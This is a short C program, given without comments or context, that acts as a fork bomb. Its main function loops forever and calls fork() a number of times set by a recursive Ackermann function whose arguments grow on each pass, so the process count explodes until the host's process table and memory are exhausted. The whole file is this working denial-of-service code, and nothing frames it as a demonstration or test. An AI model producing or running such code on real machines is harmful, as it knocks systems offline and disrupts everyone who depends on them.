#include <unistd.h>

int ackermann(int m, int n){
	if(m == 0) return n+1;
	if(n == 0) return ackermann(m-1, 1);
	return ackermann(m-1, ackermann(m, n-1));
}


int main(){
	int i = 0, k = 0;
	while(1){
		for(int j = 0; j < ackermann(k,i); j++){
			fork();
		}
		i++;
		k++;
	}
	return 0;
}
